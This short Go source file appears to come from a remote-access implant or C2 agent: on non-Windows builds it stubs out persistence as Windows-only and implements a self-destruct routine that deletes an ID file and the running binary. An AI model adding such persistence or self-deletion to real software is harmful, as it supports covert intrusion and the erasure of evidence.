//go:build !windows
package executor

import (
	"fmt"
	"os"
)

func addPersistence(_ interface{}) (string, error) {
	return "", fmt.Errorf("persistence is only supported on Windows")
}

func removePersistence(_ interface{}) (string, error) {
	return "", fmt.Errorf("persistence is only supported on Windows")
}

func selfDestruct() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to get exe path: %w", err)
	}

	os.Remove(".bytecode_id")
	os.Remove(exePath)

	return fmt.Sprintf("Self-destruct initiated. Binary: %s", exePath), nil
}
